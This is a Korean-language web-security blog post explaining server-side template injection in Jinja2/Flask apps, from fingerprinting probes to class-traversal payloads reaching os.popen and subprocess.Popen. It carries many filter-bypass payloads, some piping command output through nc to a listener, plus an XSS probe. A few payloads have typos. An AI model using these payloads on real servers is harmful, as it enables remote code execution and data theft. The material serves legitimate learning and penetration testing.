---
layout: single
title: Server Side Template Injection (SSTI)
categories: Web-vuln
tag: [Server Side Template Injection, SSTI, web, web vulnerability, injection]
toc: true
author_profile: false
---
# SSTI란 무엇인가?

> 웹 템플릿 엔진을 사용하는 웹 어플리케이션에서 일어나는 취약점으로, 웹 서버측에서 사용하는 웹 템플릿 엔진은 다양하다. 공격자는 웹 템플릿 엔진 구문을 사용하여, 웹 서버측에 페이로드를 삽입할 수 있다. SSTI 취약점은 나아가 RCE, SSRF 등으로 이어져 대상 서버의 제어권을 탈취할 수 있다. 

<hr>

## WEB Template engine 이란?

- 흔히 웹 템플릿이라 부르며, 웹 페이지를 동적으로 생성하여 렌더링 하기 위한 소프트 웨어이다.
- 보통 웹 페이지의 구조와 레이아웃등을 정의한다.
- 즉 개발자가 하나하나 웹 페이지를 다 만들기에는 버겁기 때문에, 이미 정의되어있는 HTML, CSS.., 등 그외 필요한 모든 요소로서 개발자는 필요한 부분만 동적으로 데이터를 삽입하여 본인만의 웹 페이지를 렌더링 할 수 있다

![그림 1-1](/assets/image/vuln/web-vuln/Server%20Side%20Template%20Injection%20(SSTI)/image.png)

# 공격 표면 

🌝 **<u>그렇다면 SSTI 취약점은 어떻게 식별될까?</u>** 
{: .notice--primary} 

SSTI의 경우 사용자의 입력값이 웹 페이지에 렌더링 될 때 해당 부분을 의심해볼 필요가 있다.
이런점에서 **<u style="color=red; ">XSS 공겨과 매우 유사한점을 띄며, 쉽게 놓치는 부분이다.</u>**
SSTI 취약점의 경우 사용하는 템플릿에 따라 공격구문이 모두 다르다.

![그림 1-2](/assets/image/vuln/web-vuln/Server%20Side%20Template%20Injection%20(SSTI)/image-1.png)
위의 사진은 각 웹 템플릿 엔진마다의 테스트 방법이다. 예를 들어 {{7*7}} 을 했을 때 웹 페이지에 49 7777777 가 렌더링 될 경우 JINJA2 또는 Twig 템플릿 엔진을 사용한다는 것이다.

<hr>

```javascript
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

위와 같은 코드들을 모두 주입해보며 해당 템플릿이 어떤 템플릿을 사용 하는지에 대해 테스트 해보아야 한다. 또한 **<u style="color=red; ">템플릿 종류별로 공격에 사용되는 Payload가 다르다.</u>**
이러한 테스트 페이로드는 각 템플릿마다 상이하며, 템플릿 종류는 매우 많다. 그렇기에 각 조건문을 통해 확인해보는 걸 추천한다.

![그림 1-3](/assets/image/vuln/web-vuln/Server%20Side%20Template%20Injection%20(SSTI)/image-2.png)

[SSTI PoC모음](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

```javascript
?name= a<tag>
or
?name= a}} <tag> (템플릿 구문마다 상이함)
와 같은 HTML 구문을 넣어 정상적으로'<tag>' 문자열이 출력되면 이부분도 
SSTI에 취약하다고 볼 수 있다.
```

<div class="notice">
  <h4>의도적으로 템플릿 구문을 비정상적으로 주입하여, 오류를 유발하면 렌더링 되는 오류페이지에서 템플릿의 종류를 유추해낼 수 도 있다.</h4>
</div>

# Detection

SSTI 공격은 공격 대상에서 사용되고 있는 템플릿 종류는 매우 많으며, 해당 타겟에 SSTI 취약점 식별을 위해 각각의 다양한 템플릿 구문 삽입을 통해 SSTI 취약점 유무를 판단 후 SSTI 취약점이 식별되었다면, 해당 템플릿 구문과 정보들을 통해 내부 파일 유추 또는 SSRF, RCE 등과 같은 취약점으로의 연계공격을 진행할 수 있다.

> Python Flask에서 사용되는 Jinja2 라는 템플릿을 사용하여 SSTI 구문과 공격 방식에 대해 알아보자.

기본적으로 Jinja2 Template에서 값을 출력 할 때 사용하는 구문은 {{ ... }} 을 사용한다.

```javascript
http://uri~~/?name={{7*7}}
http://uri~~/{{7*7}}
```

위와 같이 Jinja2 템플릿에서 사용되는 출력 구문인 {{…}}을 사용하여 수식을 넣었을 떄
페이지에 ‘7*7’ 이 아닌 49로 연산이 되어 나타난다면 이는 서버측에서 연산을 수행 후 반환되었다는 걸 알 수 있다.

![그림 1-4](/assets/image/vuln/web-vuln/Server%20Side%20Template%20Injection%20(SSTI)/image-3.png)

이와같이 해당 웹 서버에 SSTI 취약점이 존재한다는 걸 확인하였으며, Jinja2 템플릿을 사용한다는 걸 알게되었다. 그렇다면 우선 Global object에 접근해야한다. 그러기 위해서는 .__class__. 라는 내부 속성을 사용하면 된다. 이는 instance.__class__ 와 같이 사용할 겨우 instance가 속한 클래스를 반환한다.


<div class="notice--primary" markdown="1">
CTF 에서 주로 사용되는 방식은?
<br>
보통 CTF 에서 flag.txt를 추출하기위한 아주 기초적인 방법으로는 config 파일을 확인하면 되므로 아래와 같이 사용된다.

    ```c++
    http://uri~~/?name={{config}}
    ``` 

![그림 1-5](/assets/image/vuln/web-vuln/Server%20Side%20Template%20Injection%20(SSTI)/image-4.png)
</div>

주로 ''.__class__ 와 같이 사용되지만 ''(싱글쿼터2개) 말고도 아래와 같이 사용될 수 있다.

```
[].__class__
''.__class__
()["__class__"] 
request["__class__"]
config.__class__
```

파이썬의 경우 여러 클래스를 상속받을 수 있으며, 상속 받은 클래스를 .__base(.__bases__.)를 통해 확인할 수 있다.

```
http://uri~~/?name={{''.__class__.__base__}}
```

위와 같은 구문을 통해 **<u style=color:"red">object 클래스에 접근</u>**할 수 있게 된다.

> object 클래스는 클래스의 최상위에 존재하는 클래스이며, 그 하위에 여러 클래스들이 존재하며 str도 하위 클래스에 포함된다. 즉 ''.__class__ 를 통해 str클래스에 접근 후 .__base__를 통해 그 상위 클래스인 object에 접근한 것이다.

앞에서 object가 최상위 클래스 라고 설명했다. 그렇다면 트리형식으로 뻗어있는 클래스들이 존재할 테니 object의 하위 클래스들 목록을 확인하여야한다. 이 때 .__subclasses__() 를 사용할 수 있다.

```
http://uri~~/?name={{''.__class__.__base__.__subclasses__()}}
```

여기까지 성공하였다면, object 클래스 하위의 모든 클래스 목록을 dict 형식으로 받게된다.
여기서 공격자가 원하는 클래스를 선택하여 적절한 Payload를 구성하면된다.
[:] 와 같은 인덱싱, 슬라이싱으로 원하는 순번에 존재하는 클래스를 찾아가야한다.

![그림 1-6](/assets/image/vuln/web-vuln/Server%20Side%20Template%20Injection%20(SSTI)/image-5.png)

여러 시나리오가 존재하겠지만, 보통 RCE 로 연계하기위해 **<u style=color:"red">codecs.IncrementalDecoder</u>**  클래스와 **<u style=color:"red">subprocess.Popen</u>**클래스를 사용한다.

```
codecs.IncrementalDecoder

http://uri~~/?name={{''.__class__.__base__.__subclasses__()[125].__init.__.__globals__['sys'].moules['os'].popen('ls').read()}}
```

```
subprocess.Popen

http://uri~~/?name={{''.__class__.__base__.__subclasses__()[351]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
```

위와 같은 Payload를 사용할 수 있게된다.

<div class="notice">
  <h4>index값은 서버 환경마다 서로 상이할 수 있다.</h4>
</div>

위 코드에서 .__base__ 대신 .__mro__[1] 또는 .__bases__[0]를 사용하여도 무관하다.
mro 또한 객체가 상속받은 클래스 목록을 확인할 수 있으며,
<br><br>

**<u style=color:"red">base와 mro의 차이점은 직접 상속받은 클래스의 튜플이냐 모든 클래스의 튜플이냐의 차이이다.</u>**

> 이 외에도 Jinja2 웹 템플릿 엔진에서 사용되는 Payload는 무척 많으며, 각 상황에 맞게 적절하게 만들어 사용하여야 한다.

```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object". 
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}


# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
```

# Bypass SSTI Filtering

```
뭘 해도 안될경우 'a'+'b'와 같이 하나씩 다 따로 붙여서 시도 해볼 수 있다. EX) {{request["cl"+"ass"]["mro"]}}
```

## config Filtering

```python 
{{ self.__dict__ }}
{{ self['__dict__']}}
{{ self|attr("__dict__") }}
{{ self|attr("con"+"fig")}}
{{ self.__getitem__('con'+'fig') }}
{{ request.__dict__ }}
{{ request['__dict__']}}
{{ request.__getitem__('con'+'fig') }}
```

## .(dot) Filtering

> attr 이라는 속성을 사용하면 가능하다. ex) ''.__class__ → ''|attr('__class')

## ‘ _ [] Filtering

```python
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

request|attr(request.headers.c) #Send a header like 
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params
```

### 모든 키워드가 막혔을 시 rqeuest 객가 Filtering 안되었다면?

```python
<http://127.0.0.1:8080/?c=>{{ request|attr(request.args.get('class')|attr(request.args.get('mro'))|attr(request.args.get('getitem'))(1) }}&class=__class__&mro=__mro__&getitem=__getitem__
<http://127.0.0.1:8080?c=>{{ request|attr(request.form.get('class'))|attr(request.form.get('mro'))|attr(request.form.get('getitem'))(1) }}
<http://127.0.0.1:8080?c=>{{ request|attr(request.cookies.get('class'))|attr(request.cookies.get('mro'))|attr(request.cookies.get('getitem'))(1) }}
<http://127.0.0.1:8080?c=>{{ request|attr(request.headers.get('class'))|attr(request.headers.get('mro'))|attr(request.headers.get('getitem'))(1) }}
```

## {{}} Filtering → {% %}

```python
{% if(config.__class__.__init__.__globals__['os'].popen('ls | nc 127.0.0.1 8080')) %}{% endif %}
{% for i in range(0,500) %} {% if(((''.__class__.__mro__[1].__subclasses__()[i])|string) == "<class 'subprocess.Popen'>") %} {% if(''.__class__.__mro__[1].__subclasses__()[i]('ls | nc 127.0.0.1 8080', shell=True, stdout=-1)) %} {% endif %} {% endif %} {% endfor %}
```

# SSTI for XSS

> SSTI 취약점이 존재할경우 XSS 취약점 또한 함께 점검해보자

```
{{'<script>alert(1);</script>'}}
OR
{{'<script>alert(1);</script>'|safe}}
```

![그림 1-7](/assets/image/vuln/web-vuln/Server%20Side%20Template%20Injection%20(SSTI)/image-6.png)**<u style=color:"red">이 외에도 SSTI를 통한 연계 공격과 수많은 Payload 들이 존재하며, 각 상황에 맞게 적절하게 찾아봐야할듯하다.</u>**

# Referance
- https://www.hahwul.com/cullinan/ssti/
- https://portswigger.net/web-security/server-side-template-injection
- https://core-research-team.github.io/2021-05-01/Server-Side-Template-Injection(SSTI)
- https://me2nuk.com/SSTI-Vulnerability/
- https://dohunny.tistory.com/20
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
- https://en.wikipedia.org/wiki/Web_template_system